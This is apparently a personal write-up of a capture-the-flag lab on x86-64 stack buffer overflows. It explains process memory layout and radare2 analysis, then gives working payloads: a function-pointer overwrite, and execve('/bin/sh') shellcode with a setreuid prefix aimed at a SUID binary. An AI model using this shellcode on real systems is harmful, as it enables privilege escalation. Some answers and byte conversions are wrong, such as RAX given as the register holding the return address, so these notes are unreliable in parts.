# Buffer Overflows

# Task 1 Introduction

- Explore simple stack buffer overflows (without mitigation) on x86-64 linux programs.
- Use radare2 to examine the memory layout and familiarize with it.

### Q1 Task 1: Access target, No Answer required

# Task 2 Process Layout

When a program runs, the computer treats it as a process. Modern computers can run many processes at once, but they don’t truly run at the same time. Instead, the CPU rapidly switches between them. This fast switching is called a context switch.

Each process needs its own information to run—such as the current instruction and register values—so the operating system must store and manage all of this data. A process’s memory is arranged in a specific order:
```
+--------------------------------------+
|          Higher memory addresses     |
+--------------------------------------+
|          User Stack (↓)              |
+--------------------------------------+
|          Shared library regions      |
+--------------------------------------+
|          Run time heap (↑)           |
+--------------------------------------+
|          Read/Write Data             |
+--------------------------------------+
|          Read only code/data         |
+--------------------------------------+
|                  0                   |
+--------------------------------------+
```

### Process Memory Layout (Simplified)
- User Stack  
Stores information the program needs while running, such as the program counter and saved registers. The stack grows downwards, and unused space below it is reserved in case it needs to grow.
- Shared Library Region  
Holds code for libraries the program uses, whether they are statically or dynamically linked.
- Heap  
Used for dynamic memory allocation (e.g., malloc). It grows upwards as needed, and unused space above it is reserved for future growth.
- Program Code and Data  
Contains the program’s executable instructions and its initialised global variables.

### Q1 Task 2: Where is dynamically allocated memory stored? 
Answer: heap
### Q2 Task 2: Where is information about functions(e.g. local arguments) stored? 
Answer: stack


# Task 3 x86-64 Procedures

A program contains many functions, and the computer needs a way to keep track of which function is running and what data is being passed between them. This is what the stack is used for. The stack is a continuous block of memory that helps manage function calls and data.

The top of the stack is at a lower memory address, and the stack grows downward toward even lower addresses.

Stack operations
- Push – add data to the top of the stack
- Pop – remove data from the top of the stack

push var (assembly)
When you push a value:
- Take the value of var
- Decrease the stack pointer (rsp) by 8 bytes
- Write the value to the new rsp location (the new top of the stack)

```
Before push:
rsp → 0x8

After push:
rsp → 0x0   (rsp decreased by 8)
```

pop var (assembly)
When you pop a value:
- Read the value at the address pointed to by rsp
- Store that value into var
- Increase rsp by 8 bytes
- Top of stack is memory location 0x8 where rsp points
```
Before pop:
rsp → 0x0   (top of stack)

After pop:
rsp → 0x8   (rsp increased by 8)
```

Important: popping does not erase memory — it only moves the stack pointer.

Stack frames
Each function gets its own stack frame, which stores:
- function arguments
- local variables
- return address

A new stack frame is created when a function is called and removed when it returns.

Example
```
int add(int a, int b){
    int new = a + b;
    return new;
}

int calc(int a, int b){
    int final = add(a, b);
    return final;
}

calc(4, 5);
```

Calling calc(4, 5) creates a stack frame for calc, which then calls add, creating another stack frame above it.

## Q1 Task 3: What direction does the stack grow? (lower/higher), use the symbol "|" to represent lower and the symbol "/" to represent higher: 
Answer: questions wrong answer is l.
## Q2 Task 3: What instruction is used to add data onto the stack? 
Answer: push


# Task 4 Procedures from task 3 continued 

## Function Calls and Stack Frames

When the program runs inside the calc function:
- calc is the caller
- add is the callee

```
(fcn) sym.calc 37
  sym.calc (int arg1, int arg2);
     ; var int local_18h @ rbp-0x18
     ; var int local_14h @ rbp-0x14
     ; var int local_4h  @ rbp-0x4
     ; arg int arg1 @ rdi
     ; arg int arg2 @ rsi
     ; CALL XREF from sym.main (0x562b77135659)
     0x562b77135614      55              pushq %rbp
     0x562b77135615      4889e5          movq %rsp, %rbp
     0x562b77135618      4883ec18        subq $0x18, %rsp
     0x562b7713561c      897df8          movl %edi, local_18h ; arg1
     0x562b7713561f      8975ec          movl %esi, local_14h ; arg2
     0x562b77135622      8b55f8          movl local_18h, %edx
     0x562b77135625      8b75ec          movl local_14h, %esi
     0x562b77135628      89d6            movl %edx, %esi
     0x562b7713562a      89c7            movl %eax, %edi
     0x562b7713562c b    e8c9ffffff      callq sym.add           #<--- caller callq
     ;--rip:
     0x562b77135631      8945fc          movl %eax, local_4h
     0x562b77135634      8b45fc          movl local_4h, %eax
     0x562b77135637      c9              leave
     0x562b77135638      c3              retq
```

The instruction callq sym.add calls the add function.
When this happens:
- The CPU pushes the return address (the next instruction in calc) onto the stack.
- A new stack frame is created for add.
- The CPU updates:
    - rip → start of add
    - rsp → top of the new stack
    - rbp → base of the new frame

```
(fcn) sym.calc 37
  sym.calc (int arg1, int arg2);
     ; var int local_18h @ rbp-0x18
     ; var int local_14h @ rbp-0x14
     ; var int local_4h  @ rbp-0x4
     ; arg int arg1 @ rdi
     ; arg int arg2 @ rsi
     ; CALL XREF from sym.main (0x562b77135659)
     0x562b77135614      55              pushq %rbp
     0x562b77135615      4889e5          movq %rsp, %rbp        #<--- push rbp
     0x562b77135618      4883ec18        subq $0x18, %rsp
     0x562b7713561c      897df8          movl %edi, local_18h ; arg1
     0x562b7713561f      8975ec          movl %esi, local_14h ; arg2
     0x562b77135622      8b55f8          movl local_18h, %edx
     0x562b77135625      8b75ec          movl local_14h, %esi
     0x562b77135628      89d6            movl %edx, %esi
     0x562b7713562a      89c7            movl %eax, %edi
     0x562b7713562c b    e8c9ffffff      callq sym.add          
     ;--rip:
     0x562b77135631      8945fc          movl %eax, local_4h
     0x562b77135634      8b45fc          movl local_4h, %eax
     0x562b77135637      c9              leave
     0x562b77135638      c3              retq
```


## Stack Layout During the Call
```
Stack Bottom
┌───────────────────────────────┐
│ Previous stack frame          │
├───────────────────────────────┤
│ Stack frame for calc          │
├───────────────────────────────┤
│ Return address (for calc)     │
├───────────────────────────────┤
│ Stack frame for add           │
└───────────────────────────────┘
```

Stack Top
When add finishes, it executes retq:
- Pops the return address off the stack
- Removes its stack frame
- Restores rsp, rbp, and rip to return to calc

```
(fcn) sym.calc 37
  sym.calc (int arg1, int arg2);
     ; var int local_18h @ rbp-0x18
     ; var int local_14h @ rbp-0x14
     ; var int local_4h  @ rbp-0x4
     ; arg int arg1 @ rdi
     ; arg int arg2 @ rsi
     ; CALL XREF from sym.main (0x562b77135659)
     0x562b77135614      55              pushq %rbp
     0x562b77135615      4889e5          movq %rsp, %rbp        
     0x562b77135618      4883ec18        subq $0x18, %rsp
     0x562b7713561c      897df8          movl %edi, local_18h ; arg1
     0x562b7713561f      8975ec          movl %esi, local_14h ; arg2
     0x562b77135622      8b55f8          movl local_18h, %edx
     0x562b77135625      8b75ec          movl local_14h, %esi
     0x562b77135628      89d6            movl %edx, %esi
     0x562b7713562a      89c7            movl %eax, %edi
     0x562b7713562c b    e8c9ffffff      callq sym.add         
     ;--rip:
     0x562b77135631      8945fc          movl %eax, local_4h  #<--- finishes pop return address 
     0x562b77135634      8b45fc          movl local_4h, %eax
     0x562b77135637      c9              leave
     0x562b77135638      c3              retq
```


## Passing Data Between Functions
Arguments are passed using registers.
Up to 6 arguments can be stored in:

Register	Purpose
rdi	      1st argument
rsi	      2nd argument
rdx	      3rd argument
rcx	      4th argument
r8	      5th argument
r9	      6th argument


The return value is stored in rax.
If there are more than 6 arguments, the extras go on the stack.

## Register Saving Rules
To prevent overwriting values:

Type	              Registers	                      Saved By
Caller-saved	      rax, r10, r11	                  Caller
Callee-saved	      rbx, r12, r13, r14, rbp, rsp	  Callee
Argument registers	  rdi, rsi, rdx, rcx, r8, r9	  Caller


## Runtime Stack Overview
```
┌───────────────────────────────┐
│ Argument n                    │
├───────────────────────────────┤
│ Argument 7                    │
├───────────────────────────────┤
│ Return address                │
├───────────────────────────────┤
│ Saved registers & local vars  │
└───────────────────────────────┘
```

### Q1 Task 4: What register stores the return address? Answer: RAX


# Task 5: Endianess

Endianness (Simplified)
Computers store multi-byte values differently depending on their architecture.
Let’s take the hexadecimal number 0x12345678 as an example:

Most Significant Byte (MSB) → 12
Least Significant Byte (LSB) → 78

### Q1 Task 5: No answers required.


# Task 6 Overwriting Variables

## Understanding Buffer Overflow

In the program, an integer variable and a character buffer are stored next to each other in memory.
Because memory is contiguous, writing too much data into the buffer can overwrite the integer variable.

```
int main(int argc, char **argv)
{
    volatile int variable = 0;
    char buffer[14];

    gets(buffer);

    if (variable != 0) {
        printf("You have changed the value of the variable\n");
    } else {
        printf("Try again?\n");
    }
}
```

## Memory Alignment
Compilers often align variables to specific boundaries (like 8 or 16 bytes).
For example, if a 12‑byte array is allocated on a 16‑byte‑aligned stack, the compiler adds 4 bytes of padding to make it fit neatly.

```
| buffer (12 bytes) | padding (4 bytes) |
```
## Stack Frame Example
In the main function, the stack frame might look like this:

```
| integer variable |
| character buffer |
```

Even though the stack grows downward, data written into the buffer moves from lower to higher addresses.
If too much data is entered, it can overwrite the integer variable.

## Why gets() is Dangerous
The gets() function reads input without checking its length.
If you type more than 14 bytes, the extra data spills over into the integer variable’s memory space — changing its value.

## Try It
Run the program and input more than 14 characters.
You’ll see that the integer variable’s value changes, demonstrating a buffer overflow.

- Ssh log in first
- Compile c code first
- Ends with normal warnings nothing of concern.

Using contents first of overflow-1 folder

```
overflow-1]$ ls -la
...
-rwxrwxr-x 1 user1 user1 8224 Sep  2  2019 int-overflow
-rw-rw-r-- 1 user1 user1  291 Sep  2  2019 int-overflow.c
```

Its actually compiled closer look at the file shows its listed as not stripped meaning the debugging information and functions are not removed.

```
overflow-1]$ file int-overflow
int-overflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, BuildID[sha1]=847268d010c1aa1403e55a8891fc94d05b7ed123, not stripped
```

If not compiled just run with gcc to compile for c code:

```
 overflow-1]$ gcc int-overflow.c -o int-overflow
... Warnings listed but compiles fine.
```

## A closer look at RADARE2, then run analysis 'aaa', 'afl'

Radare2 is mentioned in the first section but up to this point is not even mentioned in any task, but example output is shown in task 4 but not identified that it was from radare2. So thought I would start with some basic commands to demonstrate some of its use. 

Note radare2 and gbd are installed on the attack box for use.

```
overflow-1]$ radare2 int-overflow
 -- The Hard ROP Cafe
[0x00400450]> aaa  
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400450]> 
```

Next 'afl' to display the functions:

```
[0x00400450]> afl
0x00400450    1 42           entry0
0x00400480    4 42   -> 37   sym.deregister_tm_clones
0x004004b0    4 58   -> 55   sym.register_tm_clones
0x004004f0    3 34   -> 29   entry.fini0
0x00400520    1 7            entry.init0
0x004005f0    1 2            sym.__libc_csu_fini
0x004005f4    1 9            sym._fini
0x00400580    3 101  -> 92   sym.__libc_csu_init
0x00400400    3 23           sym._init
0x00400527    4 75           main
0x00400430    1 6            sym.imp.puts
0x00400440    1 6            sym.imp.gets
[0x00400450]> 
```

View code if desired just wanted to see what error was but its just warning.

```
overflow-1]$ cat int-overflow.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

The variable line 'char buffer[14];' pretty much tells me 14 is going to be the maximum it will handle, try a few sizes anyway.
14 bytes → Try again?
8 bytes → Try again?
32 bytes → Overflow + Segfault - this overwrites the the return address by one byte, 31 avoids it
15 bytes → Overflow (variable changed)

Example of 14 A's no segmentation fault, within range
```
overflow-1]$ ./int-overflow 
AAAAAAAAAAAAAA
Try again?
```

32 A's segmentation fault, overflows out of variable
```
overflow-1]$ ./int-overflow 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You have changed the value of the variable
Segmentation fault
```

Success with 15 A's after variations tried

```
[user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
AAAAAAAAAAAAAAA
You have changed the value of the variable
```

### Q1 Task 6: What is the minimum number of characters needed to overwrite the variable? 
Answer: 15


# Task 7 Overwriting Function Pointers

This uses overflow-2 folder, here is part of the C code used on this task:

```
overflow-2]$ cat func-pointer.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void special()
{
    printf("this is the special function\n");
    printf("you did this, friend!\n");
}

void normal()
{
    printf("this is the normal function\n");
}

void other()
{
    printf("why is this here?");
}

int main(int argc, char **argv)
{
    volatile int (*new_ptr) () = normal;
    char buffer[14];
    gets(buffer);
    new_ptr();
}
```

Similar to the example in task 6, data is read into a buffer using the gets function, but the variable above the buffer is not a pointer to a function. A pointer, like its name implies, is used to point to a memory location, and in this case the memory location is that of the normal function. The stack is laid out similar to the example above, but this time you have to find a way of invoking the special function(maybe using the memory address of the function). Try invoke the special function in the program. 

Keep in mind that the architecture of this machine is little endian!

First off the endian is right at the start of 'file' command results:

```
overflow-2]$ file func-pointer
func-pointer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, BuildID[sha1]=4a487843f261c593a102467ecb5ea0f8cbb69b98, not stripped
```

LSB = Little Endian 

## Why does the challenge mention LSB?
Because your exploit payload must contain the address of special() in little‑endian order.
When you overflow the buffer, you replace the bytes of new_ptr with the bytes of the address of special().

The CPU expects that address in little‑endian byte order.

## A closer look at the functions using radare2 in AFL the address of special() is 0x00400567

```
overflow-2]$ radare2 func-pointer
 -- I love gradients.
[0x00400490]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400490]> afl
0x00400490    1 42           entry0
0x004004c0    4 42   -> 37   sym.deregister_tm_clones
0x004004f0    4 58   -> 55   sym.register_tm_clones
0x00400530    3 34   -> 29   entry.fini0
0x00400560    1 7            entry.init0
0x00400660    1 2            sym.__libc_csu_fini
0x00400664    1 9            sym._fini
0x00400593    1 22           sym.other
0x00400470    1 6            sym.imp.printf
0x004005f0    3 101  -> 92   sym.__libc_csu_init
0x00400438    3 23           sym._init
0x00400567    1 27           sym.special
0x00400460    1 6            sym.imp.puts
0x004005a9    1 58           main
0x00400480    1 6            sym.imp.gets
0x00400582    1 17           sym.normal
[0x00400490]> 
```

sym.special() located at 0x00400567
As 8‑byte little‑endian: 67 05 40 00 00 00 00 00
In a Python string: b"\x67\x05\x40\x00\x00\x00\x00\x00"

Option A – inspect main in radare2

```
0x00400470]> pdf @ main
\u250c 58: int main (int argc, char **argv, char **envp);
\u2502           ; var char **var_30h @ rbp-0x30
\u2502           ; var int64_t var_24h @ rbp-0x24
\u2502           ; var char *s @ rbp-0x16
\u2502           ; var int64_t var_8h @ rbp-0x8
\u2502           ; arg int argc @ rdi
\u2502           ; arg char **argv @ rsi
\u2502           ; DATA XREF from entry0 @ 0x4004ad
\u2502           0x004005a9      55             push rbp
\u2502           0x004005aa      4889e5         mov rbp, rsp
\u2502           0x004005ad      4883ec30       sub rsp, 0x30
\u2502           0x004005b1      897ddc         mov dword [var_24h], edi    ; argc
\u2502           0x004005b4      488975d0       mov qword [var_30h], rsi    ; argv
\u2502           0x004005b8      48c745f88205.  mov qword [var_8h], sym.normal ; 0x400582
\u2502           0x004005c0      488d45ea       lea rax, [s]
\u2502           0x004005c4      4889c7         mov rdi, rax                ; char *s
\u2502           0x004005c7      b800000000     mov eax, 0
\u2502           0x004005cc      e8affeffff     call sym.imp.gets           ; char *gets(char *s)
\u2502           0x004005d1      488b55f8       mov rdx, qword [var_8h]
\u2502           0x004005d5      b800000000     mov eax, 0
\u2502           0x004005da      ffd2           call rdx
\u2502           0x004005dc      b800000000     mov eax, 0
\u2502           0x004005e1      c9             leave
\u2514           0x004005e2      c3             ret
[0x00400470]> 
```

From above the line in overflow-2/func-pointer.c code 'volatile int (*new_ptr) () = normal;' resembles 

```
0x004005b8      48c745f88205...   mov qword [var_8h], sym.normal
```

From the above pdf @ main we get 

```
\u2502           ; var char **var_30h @ rbp-0x30     -> argv
\u2502           ; var int64_t var_24h @ rbp-0x24    -> argc
\u2502           ; var char *s @ rbp-0x16            -> buffer
\u2502           ; var int64_t var_8h @ rbp-0x8      -> new_ptr
```

From pdf @ main:
- s (your buffer[14]) is at: rbp - 0x16
- var_8h (your new_ptr) is at: rbp - 0x8
- Distance between them: 0𝑥16 − 0𝑥8 = 0𝑥𝐸 = 14

So:

- 14 bytes → fill buffer
- next 8 bytes → overwrite new_ptr with the address of special()

You already have:
special() = 0x00400567
Little‑endian 8‑byte form: 67 05 40 00 00 00 00 00

So your final payload is:

```
python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
```

### Q1 Task 7: Invoke the special function: Answer: You should see: 

```
overflow-2]$ python --version
Python 2.7.18

# Python2 not 3

overflow-2]$ python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
this is the special function
you did this, friend!
```

What this does is it fills buffer to limit 14 then fills the location of the variable with the location for special() and it runs


# Task 8 Buffer Overflow

This should have similarity to the Task 7. 
First off this is the code we will be working with:

```
overflow-3]$ cat buffer-overflow.c
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```

## What the aim is here:
- The goal is to read the secret.txt file
- The program buffer-overflow has suid bit set.
- When any user runs this program, it executes with the permissions of the file’s owner (user2). So user1 temporarily becomes user2 for the duration of program.
- Idea is to spawn a shell within program t allow secret.txt file to read.

Note the suid bit on buffer-overflow with user2 ownership.

```
overflow-3]$ ls -la
...
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
```

Key points:
- buffer is 140 bytes.
- strcpy(buffer, string) copies without length checking. The overflow occurs because strcpy copies user input into var_90h (the buffer at rbp-0x90) without checking length, allowing us to overwrite the saved return address.
- main method has 2 arguments int argc and char **argv.
- These will be stored on stack and it wont necessessarily be in order they follow in code. So will need to determine space after the variable we use in over flow.


If argv[1] is longer than 140 bytes, you:
- overflow buffer
- overwrite saved registers
- overwrite the return address

If you overwrite the return address with an address that points into your own buffer, and that buffer contains shellcode, the CPU will execute your shellcode when copy_arg returns.

To make hitting the shellcode easier, you prepend a NOP sled (\x90 bytes) before the shellcode.

Goal:
- Use this to spawn a shell (then read secret.txt via the SUID binary).

## Normal stack frame for copy_arg (before overflow):

```
          +---------------------------+
          |       Stack Bottom        |
          +---------------------------+
          |       Return address      |  <- where copy_arg will return to
          +---------------------------+
          |      Saved registers      |
          +---------------------------+
          |     buffer[139] ...       |
          |           ...             |
          |     buffer[1]             |
          |     buffer[0]             |
          +---------------------------+
          |        Stack Top          |
          +---------------------------+
Data is written from buffer[0] upwards in memory toward the return address.
```

## After you overflow buffer with shellcode + junk + address:

```
          +---------------------------------------------+
          |                 Stack Bottom                |
          +---------------------------------------------+
          | Address of buffer (overwritten ret addr)    |  <- now points into buffer
          +---------------------------------------------+
          | Random data (overwritten saved registers)   |
          +---------------------------------------------+
          | Random data (inside buffer)                 |
          +---------------------------------------------+
          | Shellcode (inside buffer)                   |
          +---------------------------------------------+
          |                 Stack Top                   |
          +---------------------------------------------+
When copy_arg returns, it uses the overwritten return address, which now points into your buffer (NOP sled + shellcode).
```

## Your payload in memory (what strcpy writes into buffer and beyond):

```
+-------------+-------------+-----------------+
|  NOP Sled   |  Shellcode  | Return Address  |
+-------------+-------------+-----------------+
^             ^             ^
|             |             |
|             |             +-- Overwrites saved return address
|             +---------------- Shellcode to execve("/bin/sh")
+----------------------------- Many \x90 bytes (NOPs)

Let’s say the buffer is 140 bytes.
You might structure it like this:

[ NOP sled (30–60 bytes) ]
[ Shellcode (~30 bytes) ]
[ Padding / junk (~50 bytes) ]
[ Overwritten return address (8 bytes) ]
```

- That totals roughly 140 + 8 bytes (8 is the overflow).
- What this fails to mention is the buffer variable is in the copy_arg stack for the buffer-overflow program when run. Buffer overflow might with something before or after it. And the difference needs to be determined thats why 148 bytes here will fail. But the buffer location will be used to start the buffer overflow. 
- Total length of code used to overflow needs to account buffer length + filler to reach saved RBP + address of buffer (little-endian).
- The NOP sled doesn’t have to fill the entire buffer — it just needs to be large enough to absorb small address misalignments. 
- The junk code can be anything and the overwritten part is the address that leads to somewhere in the nop sled that leads to the shell code
- Where our shell code for this example used is a bash shell in hex:

```
"\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" 
```

So the actual Python payload looks like:

Here is form first: 

```
python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"
```

- Where  random_data component = offset_to_saved_rip - len(shellcode) - len(NOPs
- offset_to_saved_rip = (saved_RIP_address - buffer_start_address)

What it should resemble:

```
python -c 'print(
    "\x90" * NOP_COUNT +
    "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
    "A" * PADDING +
    "<return address in little-endian>"
)' | ./buffer-overflow
```

Where:

- NOP_COUNT = number of \x90 bytes (e.g. 30, 50, 100…)
- PADDING = bytes to fill up to the saved return address
- <return address in little-endian> = an address somewhere in the NOP sled region (e.g. start of buffer)
- Where is return address for buffer char variable obtained from 'gbd' or 'radare2 -d' by finding the runtime address of the buffer inside copy_arg().
```
\xAA\xBB\xCC\xDD\xEE\xFF\x00\x00
```

## This is how all classic stack‑based shellcode exploits work. Example:

Where Offset to RIP is 152 + 8 bytes for overflow of return address into the RIP section

NOP_COUNT = 100 "\x90" * 100
PADDING=12 bytes -> "A" * 12
shellcode = 40 bytes
<return address> = 8 bytes
-----------------------------
Total payload size = 160 bytes

```
overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
```

## That was example but we need to obtain the return address for buffer:

start the radare2 on script running:
```
overflow-3]$ radare2 -d ./buffer-overflow
Process with PID 18104 started...
= attach 18104 18104
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Switch between print modes using the 'p' and 'P' keys in visual mode
```
'aaa' to analyse
```
[0x7ffff7dd9ef0]> aaa
[ ] Analyze all flags starting with sym.[Cannot analyze at 0x00600ff0
Invalid address from 0x004005e9
[x] Analyze all flags starting with sym. and entry0 (aa)
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Analyze function calls (aac)
[ ] Analyze len bytes of instructions fo[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[ ] Type matching analysis for all funct[TOFIX: aaft can't run in debugger mode.
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[ ] Use -AA or aaaa to perform additiona[x] Use -AA or aaaa to perform additional experimental analysis.
```
Set breakpoint BEFORE running:
```
[0x7ffff7dd9ef0]> db sym.copy_arg
[0x7ffff7dd9ef0]> 
```
Run the program with any argument:
```
[0x7ffff7dd9ef0]> ood AAAA
Wait event received by different pid 18104
Process with PID 18106 started...
= attach 18106 18106
File dbg:///home/user1/overflow-3/buffer-overflow  AAAA reopened in read-write mode
18106
[0x7ffff7dd9ef0]> 
```
Next dc tells radare2 to continue running the target process until it hits break point
Now radare2 will stop inside copy_arg.

You should see:
```
[0x7ffff7dd9ef0]> dc
Here's a program that echo's out your input
hit breakpoint at: 400527
[0x00400527]>
```
Get the actual stack addresses of locals:
```
[0x00400527]> afvd
arg arg1 =   : rdi : 0x7fffffffe6a2
var var_98h = 0x7fffffffe2b8 = (qword)0x0000000000400630
var var_90h = 0x7fffffffe2c0 = (qword)0x00007ffff7dd0400
```
In this case the location of buffer is var_90h at 0x7fffffffe2c0 so thats our target address, converted to endian \xd0\xe2\xff\xff\xff\x7f\x00\x00

To varify var_90h is buffer and identify which offset is buffer:

```
[0x00400527]> pdf @ sym.copy_arg
            ;-- rip:
\u250c 61: sym.copy_arg (int64_t arg1);
\u2502           ; var int64_t var_98h @ rbp-0x98
\u2502           ; var int64_t var_90h @ rbp-0x90
\u2502           ; arg int64_t arg1 @ rdi
\u2502           ; CALL XREF from main @ 0x40058b
\u2502           0x00400527 b    55             push rbp
\u2502           0x00400528      4889e5         mov rbp, rsp
\u2502           0x0040052b      4881eca00000.  sub rsp, 0xa0
\u2502           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1
\u2502           0x00400539      488b9568ffff.  mov rdx, qword [var_98h]
\u2502           0x00400540      488d8570ffff.  lea rax, [var_90h]
\u2502           0x00400547      4889d6         mov rsi, rdx
\u2502           0x0040054a      4889c7         mov rdi, rax
\u2502           0x0040054d      e8defeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
\u2502           0x00400552      488d8570ffff.  lea rax, [var_90h]
\u2502           0x00400559      4889c7         mov rdi, rax
\u2502           0x0040055c      e8dffeffff     call sym.imp.puts           ; int puts(const char *s)
\u2502           0x00400561      90             nop
\u2502           0x00400562      c9             leave
\u2514           0x00400563      c3             ret
[0x00400527]> 
```

Note: 
- var_90h uses x90 space thats about 16x9=144 (yes bigger than stated in code, rest is just unused space at end)
- sub rsp, 0xa0 is the total of stack 160 bytes
- padding required to reach RIP not including address is 16 bytes
- Saved RIP is always at rbp + 8
- Buffer starts at RBP - buffer_size = RBP - 144
- Offset to RIP determined by fuzzing with python and adding A's was 152

The payload you need should be:
152 for binary to RIP + 8 for the return address

NOP sled:      100 bytes    -> '/x90'*100
Shellcode:      40 bytes    -> '\x6a\x3b\x58\x48\x31\....
Padding:        12 bytes    -> 'A'*12
Return address:  8 bytes    ->  \xd0\xe2\xff\xff\xff\x7f\x00\x00
--------------------------------
Total:         160 bytes


## Drop this into your payload and enter as argument to buffer-overflow script:
```
overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
Here's a program that echo's out your input
\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffdAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\ufffd
sh-4.2$ id                                                                     
uid=1001(user1) gid=1001(user1) groups=1001(user1)
sh-4.2$ cat secret.txt
cat: secret.txt: Permission denied
sh-4.2$ 
```
- Shell word but the suid permissions not carried from user2.
- user1 tested for sudo -l and should have gone through the list of apps to find a vulnerable one but from a view of walkthroughs looks like I reached a similar point others did. So I thought I would try the pwntools options they did. What other did was to generate a prefix to our shellcode to run SETREUID, this is appended so reduce the nop sled accordingly to accomodate the new bytes.

```
$ pwn shellcraft -f d amd64.linux.setreuid 1002
\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```
That's 14 bytes extra for shell and 14 less for nop sled.

NOP = 86
setreuid = 14
shellcode = 40
padding = 12
-----------------
Total size = 152

Total payload size 152 bytes  + return address (8 bytes, or 6+2 padding) = 160 bytes

```
overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*86 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
Here's a program that echo's out your input
